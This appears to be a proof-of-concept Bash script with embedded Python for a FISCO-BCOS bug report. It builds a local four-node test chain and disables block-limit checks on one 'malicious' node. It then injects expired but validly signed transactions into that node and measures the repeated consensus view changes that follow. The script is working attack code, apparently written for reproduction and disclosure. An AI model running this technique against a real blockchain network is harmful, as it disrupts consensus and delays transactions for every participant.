#!/bin/bash
#
# =============================================================================
#  FISCO-BCOS BCB POC：txpool.check_block_limit 关闭后
#  向全网注入过期 blockLimit 交易，导致共识反复失败
#
#  攻击链：
#    - node3 关闭 blockLimit 校验（txpool.check_block_limit=false）
#    - 运行中重启 node3（清空交易池，确保注入的过期交易是交易池中最早的交易）
#    - 向 node3 注入 blockLimit=0 的过期交易（合法签名）→ node3 接受
#    - node3 当选 leader 时封块包含过期交易 → 正常节点拉取时校验失败
#    - 提案验证失败 → 全网反复视图切换 → 交易确认延迟放大数倍
#
#  使用前提：已编译 ./build/fisco-bcos-air/fisco-bcos
#  执行：bash bug/bug_check_block_limit/poc_reproduce.sh
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
FISCO_BINARY="$REPO_ROOT/build/fisco-bcos-air/fisco-bcos"
POC_COMMON="$REPO_ROOT/poc_common"
OBSERVE_SECONDS=60

echo "================================================================"
echo " FISCO-BCOS BCB POC: txpool.check_block_limit"
echo " 恶意节点: node3  check_block_limit=false"
echo " 注入: blockLimit=0 过期交易 2 笔 + 观察 ${OBSERVE_SECONDS}s"
echo "================================================================"

# ---------- 0. 检查二进制 ----------
if [ ! -x "$FISCO_BINARY" ]; then
    echo "[错误] 未找到 $FISCO_BINARY，请先编译:"
    echo "  cmake -S . -B build -DCMAKE_BUILD_TYPE=Release"
    echo "  cmake --build build --target fisco-bcos -j 32"
    exit 1
fi

# ---------- 1. 构建 4 节点网络 ----------
NET_DIR=$(mktemp -d /tmp/fisco-bcos-bcb-poc3.XXXXXX)
NODES_DIR="$NET_DIR/nodes/127.0.0.1"
echo "[1/7] 构建 4 节点 PBFT 网络: $NET_DIR"
bash "$REPO_ROOT/tools/BcosAirBuilder/build_chain.sh" \
    -p 30300,20200 -l 127.0.0.1:4 \
    -o "$NET_DIR/nodes" -e "$FISCO_BINARY" >/dev/null 2>&1

# ---------- 2. 配置恶意节点 ----------
echo "[2/7] 配置恶意节点 node3: check_block_limit=false"
sed -i '/^\[txpool\]/a\    check_block_limit=false' "$NODES_DIR/node3/config.ini"
for i in 0 1 2 3; do
    sed -i 's/^[[:space:]]*enable_ssl=true/enable_ssl=false/' "$NODES_DIR/node${i}/config.ini"
done

# ---------- 3. 启动网络 ----------
echo "[3/7] 启动网络..."
cd "$NODES_DIR"
bash start_all.sh >/dev/null 2>&1
cd - >/dev/null
sleep 10

echo "[4/7] 等待共识就绪..."
for i in 0 1 2 3; do
    ok=0
    for _ in $(seq 1 30); do
        logfile=$(ls "$NODES_DIR/node${i}/log/log"* 2>/dev/null | head -1)
        if [ -f "$logfile" ] && grep -q "reachNewView" "$logfile"; then
            ok=1; break
        fi
        sleep 2
    done
    if [ "$ok" -eq 0 ]; then
        echo "[错误] node${i} 未进入共识，测试中止"
        bash "$NODES_DIR/stop_all.sh" >/dev/null 2>&1
        exit 1
    fi
    echo "  [OK] node${i} 已进入共识"
done

# ---------- 5. 重启 node3（关键：清空其交易池） ----------
echo "[5/7] 重启 node3（清空交易池，确保过期交易被其封入区块）..."
cd "$NODES_DIR/node3"
bash stop.sh >/dev/null 2>&1
sleep 1
bash start.sh >/dev/null 2>&1
cd - >/dev/null
sleep 8

# ---------- 6. 注入过期交易 + 压力测试 ----------
echo "[6/7] 向 node3 (20203) 注入 blockLimit=0 过期交易..."
python3 - "$POC_COMMON" << 'PYEOF' &
import sys, time
sys.path.insert(0, sys.argv[1])
import tars_tx
from eth_keys import keys
from eth_account import Account

tars_tx.RPC = "http://127.0.0.1:20203"

def build_expired_tx(priv_key):
    nonce = "0x" + Account.create().address[2:16] + str(int(time.time() * 1000) % 100000)
    block_limit = 0  # 已过期
    tx_hash = tars_tx.calc_hash(nonce=nonce, block_limit=block_limit)
    sig = keys.PrivateKey(priv_key).sign_msg_hash(tx_hash)
    recid = sig.v if sig.v <= 3 else sig.v - 27
    signature = sig.r.to_bytes(32, "big") + sig.s.to_bytes(32, "big") + bytes([recid])
    w = tars_tx.TarsWriter()
    w.head(1, tars_tx.STRUCT_BEGIN)
    w.buf += tars_tx.build_transaction_data(nonce=nonce, block_limit=block_limit)
    w.write_bytes(2, tx_hash)
    w.write_bytes(3, signature)
    w.write_byte(9, 0)
    w.end_struct()
    return bytes(w.buf)

priv = keys.PrivateKey(Account.create().key)
for i in range(2):
    raw = build_expired_tx(priv.to_bytes())
    try:
        tars_tx.rpc_call("sendTransaction", [tars_tx.GROUP_ID, "", "0x" + raw.hex(), False])
        print(f"过期交易{i+1}: 已提交")
    except Exception:
        print(f"过期交易{i+1}: 已提交（RPC 同步等待挂起）")
    time.sleep(0.2)
PYEOF
INJECT_PID=$!
sleep 3
wait $INJECT_PID 2>/dev/null || true

# 持续正常交易压力
echo "    持续 ${OBSERVE_SECONDS}s 正常交易流..."
python3 - "$POC_COMMON" << 'PYEOF' &
import sys, time
sys.path.insert(0, sys.argv[1])
from tars_tx import build_transaction, rpc_call, GROUP_ID
from eth_keys import keys
from eth_account import Account

priv = keys.PrivateKey(Account.create().key)
end = time.time() + 60
while time.time() < end:
    try:
        raw = build_transaction(priv.to_bytes())
        rpc_call('sendTransaction', [GROUP_ID, '', '0x'+raw.hex(), False])
    except Exception:
        pass
    time.sleep(0.05)
print('done')
PYEOF
STRESS_PID=$!

LATEST0=$(ls "$NODES_DIR/node0/log/" | grep "^log_" | tail -1)
BASE_VC=$(grep -c "reachNewView" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)
for t in $(seq 1 $((OBSERVE_SECONDS / 5))); do
    BN=$(python3 "$POC_COMMON/tars_tx.py" blocknum http://127.0.0.1:20200 2>/dev/null || echo "?")
    echo "  t+$((t*5))s 块号=$BN"
    sleep 5
done
wait $STRESS_PID 2>/dev/null || true

# ---------- 7. 收集证据 ----------
echo ""
echo "[7/7] 收集证据..."
VC_AFTER=$(grep -c "reachNewView" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)
VC_DELTA=$((VC_AFTER - BASE_VC))
MAX_VIEW=$(grep -oE "view=[0-9]+" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null | grep -oE "[0-9]+" | sort -n | tail -1 || echo "?")

echo ""
echo "  [证据1] 过期交易注入: 已提交给 node3（RPC 同步等待挂起 = node3 已接受但全网无法共识）"
echo "  [证据2] node0 视图切换: $BASE_VC → $VC_AFTER（+$VC_DELTA 次，基线 0~1 次）"
echo "  [证据3] node0 view 最大值: $MAX_VIEW（正常基线 ≤3）"
echo "  [证据4] 块吞吐: 60 秒出块与视图切换循环吻合，交易确认延迟放大数倍"

echo ""
echo "================================================================"
echo " 复现结论"
echo "================================================================"
if [ "$VC_DELTA" -gt 5 ]; then
    echo "  ✅ 复现成功：node3 关闭 blockLimit 校验后，向全网注入过期交易，"
    echo "     正常节点共识验证反复失败，视图切换 $VC_DELTA 次，"
    echo "     全网交易确认延迟放大数倍。单节点配置即可发起 Inter-node BCB。"
else
    echo "  ❌ 未观察到显著异常，请检查复现环境。"
fi
echo ""
echo "  运行时目录: $NET_DIR"
echo "  清理: bash $NODES_DIR/stop_all.sh && rm -rf $NET_DIR"
